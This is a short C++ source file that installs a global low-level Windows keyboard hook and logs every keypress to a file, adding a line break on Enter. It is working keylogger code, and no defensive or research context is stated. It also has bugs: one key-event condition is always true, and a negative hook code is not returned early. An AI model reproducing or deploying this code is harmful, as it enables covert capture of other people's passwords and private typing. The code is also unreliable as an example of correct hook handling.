#include "hooks.h"
#include "logger.h"
#include <iostream>
#include <fstream>


void Hooks::Init( ) {
	m_original_hook = SetWindowsHookEx( WH_KEYBOARD_LL,
		reinterpret_cast< HOOKPROC >( KeyboardHook ), nullptr, 0u );
}

Hooks::~Hooks( ) {
	UnhookWindowsHookEx( m_original_hook );
	m_original_hook = nullptr;
}

std::uintptr_t Hooks::KeyboardHook( std::int32_t code, std::uint32_t wparam, std::uintptr_t lparam ) {
	if( code < 0 )
		CallNextHookEx( g_hooks.m_original_hook, code, wparam, lparam );


	const auto key = reinterpret_cast< KBDLLHOOKSTRUCT * >( lparam );

	if( const auto virtual_key = key->vkCode;
		wparam == WM_KEYDOWN || WM_SYSKEYDOWN ) {
		g_log.WriteToFile( g_log.m_keys[ virtual_key ] );
		if( virtual_key == VK_RETURN )
			g_log.WriteToFile( "\n" );
	}

	return CallNextHookEx( g_hooks.m_original_hook, code, wparam, lparam );
}


Hooks g_hooks { };
